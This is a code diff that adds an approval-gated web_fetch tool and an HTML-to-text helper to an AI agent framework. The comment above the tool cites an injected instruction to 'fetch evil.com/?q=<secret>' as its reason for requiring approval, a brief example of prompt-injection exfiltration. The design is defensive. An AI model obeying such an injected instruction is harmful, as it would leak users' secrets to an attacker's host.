@@ -3,9 +3,12 @@
 import ast
 import operator
 import re
+import html
 import subprocess
 from pathlib import Path
 from typing import Annotated
+
+import httpx
 
 from horde.tools import tool
 
@@ -162,6 +165,31 @@ def update_plan(
     return f"Plan updated ({done}/{len(items)} done):\n" + "\n".join(items)
 
 
+# --- web ---------------------------------------------------------------------
+
+def html_to_text(page: str) -> str:
+    """Crude but dependency-free: drop scripts/styles and tags, keep the words."""
+    page = re.sub(r"(?is)<(script|style|noscript)\b.*?</\1>", " ", page)
+    page = re.sub(r"(?i)<br\s*/?>|</(p|div|li|h[1-6]|tr)>", "\n", page)
+    text = html.unescape(re.sub(r"<[^>]+>", " ", page))
+    lines = (" ".join(line.split()) for line in text.splitlines())
+    return "\n".join(line for line in lines if line)
+
+
+# Asks first: a URL can carry data out (e.g. an injected "fetch evil.com/?q=<secret>").
+@tool(needs_approval=True)
+def web_fetch(url: Annotated[str, "The http(s) URL to fetch"]) -> str:
+    """Fetch a web page and return its text (HTML is converted to plain text)."""
+    if not url.startswith(("http://", "https://")):
+        raise ValueError("only http(s) URLs are supported")
+    response = httpx.get(url, follow_redirects=True, timeout=30.0,
+                         headers={"User-Agent": "agent-horde/0.1"})
+    response.raise_for_status()
+    if "html" in response.headers.get("content-type", ""):
+        return html_to_text(response.text)
+    return response.text
+
+
 # --- long-term memory -------------------------------------------------------
 # Facts saved here are loaded into every new conversation.
 
@@ -202,4 +230,4 @@ def run_shell(
 
 
 DEFAULT_TOOLS = [calculator, read_file, write_file, edit_file, list_files, search_files,
-                 update_plan, remember, run_shell]
+                 update_plan, remember, web_fetch, run_shell]
